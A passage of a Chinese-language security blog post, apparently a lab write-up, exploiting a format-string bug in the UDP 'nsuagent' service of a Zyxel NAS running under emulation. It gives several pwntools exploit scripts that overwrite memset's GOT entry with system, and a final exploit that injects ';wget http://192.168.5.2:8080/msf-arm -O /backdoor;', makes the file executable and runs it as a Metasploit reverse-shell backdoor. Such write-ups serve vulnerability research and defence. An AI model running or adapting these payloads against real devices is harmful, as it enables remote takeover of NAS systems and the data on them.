v19, v20, v21);</span><br><span class="line">    <span class="keyword">if</span> ( sub_157CC(a1, &amp;v41) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_51:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v33);</span><br><span class="line">    sub_1F224(v46);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1F4C4(&amp;v34, v46);</span><br><span class="line">  sub_1F4DC(&amp;v35, v46);</span><br><span class="line">  sub_14C60(a1, <span class="string">&quot;username: %s, password: %s\n&quot;</span>, v34, v35);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据上面的代码框，我们知道程序在启动完毕之后会阻塞在<code>recvfrom</code>函数直到用户向程序发送了数据，在接收到输入之后会根据相应的判断语句进行处理。根据程序的行为知道处理完成之后它并不会退出，而是阻塞在<code>recvfrom</code>继续等待接收下一次用户的输入。<code>sub_14C60</code>在解析用户可控的<code>username</code>与<code>password</code>前的debug数据如下，这两者均存在于堆上：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669600771812-b37defcb-889a-4779-9212-69ef134417e2.png" alt="image.png"></p>
+<h3 id="③、思路整理"><a href="#③、思路整理" class="headerlink" title="③、思路整理"></a>③、思路整理</h3><p>将上面的exp稍微的进行修改以方便更换我们的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">accept</span>():</span><br><span class="line">    l=listen(<span class="number">50127</span>, typ=<span class="string">&#x27;udp&#x27;</span>)	<span class="comment"># 监听本地（Ubuntu）的50127端口</span></span><br><span class="line">    l.wait_for_connection()</span><br><span class="line">    <span class="built_in">print</span>(l.recv(<span class="number">100</span>))			<span class="comment"># 接收100字节应该够了</span></span><br><span class="line">    l.close()</span><br><span class="line"></span><br><span class="line">thread = Thread(target=accept)</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;192.168.5.1&#x27;</span>, <span class="number">50127</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line">payload_username = <span class="string">b&quot;cyberangel&quot;</span></span><br><span class="line">payload_password = <span class="string">b&quot;bbbb&quot;</span>+<span class="string">b&quot;.%p&quot;</span>*<span class="number">50</span>			<span class="comment"># payload</span></span><br><span class="line">encode_username = payload_username.<span class="built_in">hex</span>()</span><br><span class="line">encode_password = payload_password.<span class="built_in">hex</span>()</span><br><span class="line">data=<span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">f&quot;00420241001c42af5b3a004f525400123456555345524e414d453a<span class="subst">&#123;encode_username&#125;</span>0950415353574f52443a<span class="subst">&#123;encode_password&#125;</span>0953484152455f5245513a30094654505f5245513a30&quot;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<p>回过头来仔细研究<code>sub_14C60</code>，发现它会将执行日志输出到文件<code>/tmp/nsu_process</code>中，并且该日志永远不会删除：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669606290140-6aa6337f-9d96-419a-b2d9-07a426b3b505.png" alt="image.png"></p>
+<p>执行一次<code>exp2.py</code>后可以有如下日志，</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669605289357-a86237ed-2e76-438c-90e2-2f781c4eddf8.png" alt="image.png"></p>
+<p>但是程序对输入的payload（password）有32字节长度限制，导致泄露的地址并不完整…</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669612862423-45b0bb55-cc6b-4e12-a6ed-d566d550e780.png" alt="image.png"></p>
+<p>仔细想想，就算泄露出来的地址是完整的又怎样？因为我们并不能<strong>在程序回显时拿到任何有效信息</strong>：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669684873905-5771c21f-e7dc-4873-8bf7-f2a0c888edb1.png" alt="image.png"></p>
+<p>这就意味着所有leak地址的思路都已经被堵死，并且程序还开启了NX保护，无法在stack上构造自己的ROP链；那就只能利用程序里面现有的已知数据构造利用链了。从程序保护方面来讲，<code>nsuagent</code>最大的弱点在没有开启RELRO保护，所以获取我们可以从这里下手：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669596666718-6afae6aa-92bf-43db-97ec-9638187528d3.png" alt="image.png"></p>
+<p>利用方式有两种：</p>
+<ol>
+<li>是利用ret2dlresolve去修改处于可写状态的 <code>.dynamic</code> 节的 <code>DT_STRTAB</code> 的 <code>d_ptr</code> 指针，这就要求我们需要在栈上伪造一个 <code>ELF String Table（.dynstr section）</code> ，并篡改相应的结构指针，这样在动态链接的时候就会将该符号解析为system函数。（利用手法详见：<br><a href="../../PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E8%BF%9B%E9%98%B6/PWN%E8%BF%9B%E9%98%B6%EF%BC%881-8%EF%BC%89-ret2dlresolve(1)%EF%BC%88%E9%AB%98%E7%BA%A7ROP%EF%BC%89/PWN%E8%BF%9B%E9%98%B6%EF%BC%881-8%EF%BC%89-ret2dlresolve(1)%EF%BC%88%E9%AB%98%E7%BA%A7ROP%EF%BC%89.md&inner=Kga4K">PWN进阶（1-8）-ret2dlresolve(1)（高级ROP）</a><br>）</li>
+<li>因为.got.plt（俗称got表）可写，那我们就直接篡改got表为某个函数的地址并正常调用被篡改的函数即可。</li>
+</ol>
+<p>emmm，相比较而言还是第二种方法比较简单，那就用它吧。具体实施之前我们还是来看一个简单的例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">(<span class="type">char</span>* str)</span>&#123;</span><br><span class="line">	system(str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/cyberangel/Desktop/test1&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    No canary found</span></span><br><span class="line"><span class="comment">    NX:       NX enabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>启动gdb断到main函数，将puts的got表手动改为system的plt：<code>set *0x600958=0x400410</code></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669688176426-aa734134-32a6-4799-83e6-34974103cc56.png" alt="image.png"></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669688225324-b1e4e49a-4241-4b89-82cc-eca324aa9696.png" alt="image.png"></p>
+<p>continue后会执行<code>system(&quot;/bin/sh&quot;)</code>：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669688537084-16615508-3da9-4616-84c0-e175bf9ec159.png" alt="image.png"></p>
+<p>这样做似乎无法维持一个稳定的shell，执行一条命令就退出了，不知道是不是我的问题；当然了，就算存在这个问题但对于nsuagent并不影响，因为只要程序不崩溃就会一直可以接收用户的输入，从而实现多次命令执行的效果。还要说明一点的是注意arm与x86在<code>.got.plt</code>的区别，nsuagen的<code>.got</code>就是x86的<code>.got.plt</code>：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669688795898-5dfac506-9cbc-42b4-bc98-b6cd3ff5ed47.png" alt="image.png"></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669688850018-8cc2ec79-7a59-4c70-bdad-5ed07b5aaeb0.png" alt="image.png"></p>
+<p>不知道是不是因为libc版本过低的问题：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669689152563-6096f815-d30c-4d62-9daa-9b43ef5c7810.png" alt="image.png"></p>
+<blockquote>
+<ul>
+<li>在我印象里好像只有got表被篡改为某个函数的真实地址，并没有见过got还能被篡改为plt的这种方法，可能是我失忆了？？？</li>
+</ul>
+</blockquote>
+<h3 id="④、构造利用链"><a href="#④、构造利用链" class="headerlink" title="④、构造利用链"></a>④、构造利用链</h3><p>好了，到现在我们整理一下思路，因为got表是可写的，所以我们可以劫持某个函数的got表为system以达到命令执行的效果（Linux延迟绑定技术）。那我们究竟篡改哪一个函数呢？注意到漏洞点有一个<code>memset</code>：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669689656885-704988cf-6bd0-462f-9f72-2b8a88cf0b99.png" alt="image.png"></p>
+<p>根据栈帧平衡原理再结合<code>sub_1AEE4</code>的汇编代码我们可以知道<strong>每次</strong>调用<code>sub_14C60</code>时memset初始化s变量的栈空间完全相同（空间的起始地址与结束地址相同），可以下个断点来看看（<code>b *0x14C7C</code>）：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669690143614-d21cb7c2-01ed-4bad-87ca-fb6d50a397e8.png" alt="image.png"></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669690155894-d3ed6227-9284-4be2-8557-e75d9f091bab.png" alt="image.png"></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669690164277-982c4939-fb98-4b81-90ad-9aa4a3a52b5a.png" alt="image.png"></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669690183731-c28094c0-9023-4258-ab28-7a3ffb75da98.png" alt="image.png"></p>
+<p>虽然将memset篡改为system会导致无法清空栈空间，但是好在每一次调用函数时影响的都是同一片内存区域，并不影响程序的正常运行；而且还有一个好处就是我们可以多次的主动调用memset函数。</p>
+<blockquote>
+<ul>
+<li>system调用失败后并不会让程序崩溃</li>
+</ul>
+</blockquote>
+<p>首先测量格式化字符串的偏移，在gdb调试时断点下在<code>sub_14C60</code>调用<code>fprintf</code>之前（<code>b *0x14CE0</code>）：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669707460032-b4ba2387-7e8c-4561-bdc4-c944c875bcc2.png" alt="image.png"></p>
+<p>再次调试并发送前面的<code>exp2.py</code>：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669707669927-645f88ec-e1da-40e8-b6e4-1e098d50ff5d.png" alt="image.png"></p>
+<p>如上图所示，R1存放着被截断之后的格式化字符串，但是我们可以仍旧在栈上找到残留的完整字符串：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669707887409-981573ba-65a6-4621-9985-792a34bdffae.png" alt="image.png"></p>
+<p>我们截取该段字符串从USERNAME开始使用，其起始地址为<code>0x7e8d49b2</code>：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669708031841-957cb8f2-04c8-4cb6-aa76-6da2147e9dd0.png" alt="image.png"></p>
+<p>接下来强制将R1寄存器改为该地址：<code>set $r1=0x7e8d49b2</code>，运行后可以得到如下结果：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669708207985-577e5a93-e736-4795-85d3-f2b030c44afa.png" alt="image.png"></p>
+<p>整理可以得到偏移为39：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669708701032-5ff7b28a-8728-4d33-b424-42a882d53ea7.png" alt="image.png"></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669708788515-5cd3629d-a5b0-49e0-bbd0-06e4928d535d.png" alt="image.png"></p>
+<p>然后开始使用<code>格式化字符串$n</code>更改<code>memset</code>的got表，首先是：<code>payload_password = b&quot;bbbb&quot;+b&quot;%73904c%39$n&quot;</code></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669709275141-ba4fbc37-bcfa-47f5-a5c0-520a041c95d8.png" alt="image.png"></p>
+<p>发现程序会崩溃：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669710841854-276f3993-ac6a-4ab1-87d7-c49d9d0f5383.png" alt="image.png"></p>
+<p>这也很正常，payload中<code>%73904c%39$n</code>本身的含义就是“打印73904个字节，然后将打印的字节数目作为值写入距离格式化字符串偏移为39的栈上指针**<span style="color: #E8323C">指向</span><strong>的区域。从上图来看向非法地址</strong>bbbb**写入的不是system的plt而是<code>_cxa_pure_virtual</code>：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669712075770-e3feb687-5ed9-4647-987d-6c102ff73ef6.png" alt="image.png"></p>
+<blockquote>
+<ol>
+<li><code>0x120D4 - 0x120b0 == 0x24（36）</code></li>
+<li><code>73904 - 36 == 73868</code></li>
+</ol>
+</blockquote>
+<p>稍微修改一下payload：<code>payload_password = p32(memset_got)+b&quot;%73868c%39$n&quot;【memset_got = 0x34BE4】</code>，要将地址减去36的原因在于进入漏洞函数时会进行如下拼接：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669857141609-2b94a903-a4ac-4430-9a17-4c9c8c69a5ba.png" alt="image.png"></p>
+<p>也就是在执行fprintf时其参数格式化字符串为：<code>username: cyberangel, password: addr%73868c%39$n</code>，从该字符串开头到格式化字符串的位置一共36字节，fprintf会直接将这36字节的字符直接输出，再结合上面的内容故需要减36：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669857379186-9c711407-781f-4c0c-9afc-b431de747a36.png" alt="image.png"></p>
+<p>执行后发现我们输入的payload会发生”\x00”截断：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669774666622-c5504048-3fdf-4e0f-8d6d-1538ec6351a5.png" alt="image.png"></p>
+<p>我们后面输入的格式化字符串没有了！gdb后得知程序在解析密码时发生了截断，如下图所示，其中v46保存了我们所有发送数据的buffer：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669775849869-78de9140-d63d-4779-9889-4dcc5c7347dc.png" alt="image.png"></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669775992475-c94c75a0-311d-4a76-a6aa-a5e62a244b16.png" alt="image.png"></p>
+<p>经过<code>sub_1F4DC</code>的<code>std::string::string</code>后：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_1F4DC</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(a1, (<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> *)(a2 + <span class="number">24</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669776161137-154e8bcc-19f0-4190-ada7-2df9f8ffb856.png" alt="image.png"></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669776201703-8e2f3460-3e5f-4bf9-b45c-ba0faaa574df.png" alt="image.png"></p>
+<p>真好，被截的什么都不剩…稍微调整一下<code>p32(memset_got)</code>的位置，有：<code>payload_password = b&#39;bbbb&#39;+b&quot;%73868c%43$n&quot;+p32(memset_got)</code></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669776376429-4cda800a-cdfa-4d66-abc8-444b7b6fe7d7.png" alt="image.png"></p>
+<p>嘿嘿，这下应该没问题了吧？</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669776547684-18bb545b-5096-40a7-a744-c809c4510b9d.png" alt="image.png"></p>
+<p>艹，哪儿来的0x0a（’\n’）？我找了半天才发现是格式化是自带的…</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669776585783-a14c648e-0caa-46dd-8d97-e85b9cdb6e2d.png" alt="image.png"></p>
+<p>绝，那就不能使用经过<code>vsnprintf</code>拼接后的字符串了。但是我们注意到，<code>recvfrom</code>接收用户输入之后会将数据保留到栈上，它是未经修改，原汁原味的数据，如下图所示（<code>b *0x14CE0</code>）：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669794145791-75788566-0b9e-49c9-8f32-29f6943fa9e8.png" alt="image.png"></p>
+<p>重复上面寻找偏移的步骤，有如下<code>exp3.py</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;arm&quot;</span></span><br><span class="line">context.endian=<span class="string">&quot;little&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">accept</span>():</span><br><span class="line">    l=listen(<span class="number">50127</span>, typ=<span class="string">&#x27;udp&#x27;</span>)	<span class="comment"># 监听本地（Ubuntu）的50127端口</span></span><br><span class="line">    l.wait_for_connection()</span><br><span class="line">    <span class="built_in">print</span>(l.recv(<span class="number">100</span>))			<span class="comment"># 接收100字节应该够了</span></span><br><span class="line">    l.close()</span><br><span class="line"></span><br><span class="line">thread = Thread(target=accept)</span><br><span class="line">thread.start()  </span><br><span class="line"></span><br><span class="line">memset_got=<span class="number">0x34BE4</span></span><br><span class="line">p=remote(<span class="string">&#x27;192.168.5.1&#x27;</span>, <span class="number">50127</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line">payload_username = <span class="string">b&quot;cyberangel&quot;</span></span><br><span class="line">payload_password = <span class="string">b&#x27;bbbb&#x27;</span>+<span class="string">b&quot;%73868c%347$n&quot;</span>+p32(memset_got)		<span class="comment"># b&#x27;bbbb&#x27;+b&quot;%73868c%43$n&quot;+p32(memset_got)</span></span><br><span class="line">encode_username = payload_username.<span class="built_in">hex</span>()</span><br><span class="line">encode_password = payload_password.<span class="built_in">hex</span>()</span><br><span class="line">data=<span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">f&quot;00420241001c42af5b3a004f525400123456555345524e414d453a<span class="subst">&#123;encode_username&#125;</span>0950415353574f52443a<span class="subst">&#123;encode_password&#125;</span>0953484152455f5245513a30094654505f5245513a30&quot;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669794654943-13242f1c-2143-4066-99ff-a10e7e29decd.png" alt="image.png"></p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669794679556-1e1e6705-b5c2-485a-9406-028cf440a674.png" alt="image.png"></p>
+<p>可以看到成功命令执行。现在memset已经被成功改为了system了，最后完善一下就可以了。因为该NAS有wget，所以我们先修复一下软链接：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># rm ./usr/sbin/wget </span></span><br><span class="line">/ <span class="comment"># ln -s /bin/busybox /usr/sbin/wget</span></span><br><span class="line">/ <span class="comment"># wget</span></span><br><span class="line">BusyBox v1<span class="number">.19</span><span class="number">.4</span> (<span class="number">2021</span>-04-01 09:<span class="number">56</span>:<span class="number">40</span> CST) multi-call binary.</span><br><span class="line"></span><br><span class="line">Usage: wget [-c|--<span class="keyword">continue</span>] [-s|--spider] [-q|--quiet] [-O|--output-document FILE]</span><br><span class="line">	[--header <span class="string">&#x27;header: value&#x27;</span>] [-Y|--proxy on/off] [-P DIR]</span><br><span class="line">	[--no-check-certificate] [-U|--user-agent AGENT] [-T SEC] URL...</span><br><span class="line"></span><br><span class="line">/ <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>使用kali生成msf反向shell，注意这里的LHOST为虚拟机的IP而不是qemu的IP：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669797135238-6af0ab12-2da3-4253-924c-0dc3b37961df.png" alt="image.png"></p>
+<p>使用python在msf目录下启动http服务：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669797254370-f1935361-4a3c-481f-9598-555a7a64a5c7.png" alt="image.png"></p>
+<p>完整exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;arm&quot;</span></span><br><span class="line">context.endian=<span class="string">&quot;little&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">accept</span>():</span><br><span class="line">    l=listen(<span class="number">50127</span>, typ=<span class="string">&#x27;udp&#x27;</span>)	<span class="comment"># 监听本地（Ubuntu）的50127端口</span></span><br><span class="line">    l.wait_for_connection()</span><br><span class="line">    <span class="built_in">print</span>(l.recv(<span class="number">100</span>))			<span class="comment"># 接收100字节应该够了</span></span><br><span class="line">    l.close()</span><br><span class="line"></span><br><span class="line">thread = Thread(target=accept)</span><br><span class="line">thread.start()  </span><br><span class="line"></span><br><span class="line">memset_got=<span class="number">0x34BE4</span></span><br><span class="line">p=remote(<span class="string">&#x27;192.168.5.1&#x27;</span>, <span class="number">50127</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line">payload1_username = <span class="string">b&quot;cyberangel&quot;</span></span><br><span class="line">payload1_password = <span class="string">b&#x27;bbbb&#x27;</span>+<span class="string">b&quot;%73868c%347$n&quot;</span>+p32(memset_got)</span><br><span class="line">encode1_username = payload1_username.<span class="built_in">hex</span>()</span><br><span class="line">encode1_password = payload1_password.<span class="built_in">hex</span>()</span><br><span class="line">data1=<span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">f&quot;00420241001c42af5b3a004f525400123456555345524e414d453a<span class="subst">&#123;encode1_username&#125;</span>0950415353574f52443a<span class="subst">&#123;encode1_password&#125;</span>0953484152455f5245513a30094654505f5245513a30&quot;</span>)</span><br><span class="line">p.send(data1)</span><br><span class="line"></span><br><span class="line">payload2_username = <span class="string">b&quot;;wget http://192.168.5.2:8080/msf-arm -O /backdoor;&quot;</span>	<span class="comment"># 下载backdoor</span></span><br><span class="line">payload2_password = <span class="string">b&quot;cyberangel&quot;</span></span><br><span class="line">encode2_username = payload2_username.<span class="built_in">hex</span>()</span><br><span class="line">encode2_password = payload2_password.<span class="built_in">hex</span>()</span><br><span class="line">data2=<span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">f&quot;00420241001c42af5b3a004f525400123456555345524e414d453a<span class="subst">&#123;encode2_username&#125;</span>0950415353574f52443a<span class="subst">&#123;encode2_password&#125;</span>0953484152455f5245513a30094654505f5245513a30&quot;</span>)</span><br><span class="line">p.send(data2)</span><br><span class="line"></span><br><span class="line">payload3_username = <span class="string">b&quot;;chmod +x /backdoor;&quot;</span>		<span class="comment"># 授予可执行权限</span></span><br><span class="line">payload3_password = <span class="string">b&quot;cyberangel&quot;</span></span><br><span class="line">encode3_username = payload3_username.<span class="built_in">hex</span>()</span><br><span class="line">encode3_password = payload3_password.<span class="built_in">hex</span>()</span><br><span class="line">data3=<span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">f&quot;00420241001c42af5b3a004f525400123456555345524e414d453a<span class="subst">&#123;encode3_username&#125;</span>0950415353574f52443a<span class="subst">&#123;encode3_password&#125;</span>0953484152455f5245513a30094654505f5245513a30&quot;</span>)</span><br><span class="line">p.send(data3)</span><br><span class="line"></span><br><span class="line">payload4_username = <span class="string">b&quot;;/backdoor;&quot;</span>				<span class="comment"># 执行backdoor</span></span><br><span class="line">payload4_password = <span class="string">b&quot;cyberangel&quot;</span></span><br><span class="line">encode4_username = payload4_username.<span class="built_in">hex</span>()</span><br><span class="line">encode4_password = payload4_password.<span class="built_in">hex</span>()</span><br><span class="line">data4=<span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">f&quot;00420241001c42af5b3a004f525400123456555345524e414d453a<span class="subst">&#123;encode4_username&#125;</span>0950415353574f52443a<span class="subst">&#123;encode4_password&#125;</span>0953484152455f5245513a30094654505f5245513a30&quot;</span>)</span><br><span class="line">p.send(data4)</span><br><span class="line"></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<p>先在虚拟机上监听：</p>
+<p><img src="/assets/posts/iot-10-2-zyxel-nas-arm32-hijack-got-udp-cc0vky/assets/1669797404350-c3d7b8d1-259b-43d8-9dcc-d75ecc71da35.png" alt="image.png"></p>
+<p>正向shell的生成步骤如下（默认向外映射端口为4444），exp稍微变动一下msf文件名称就行：</p>
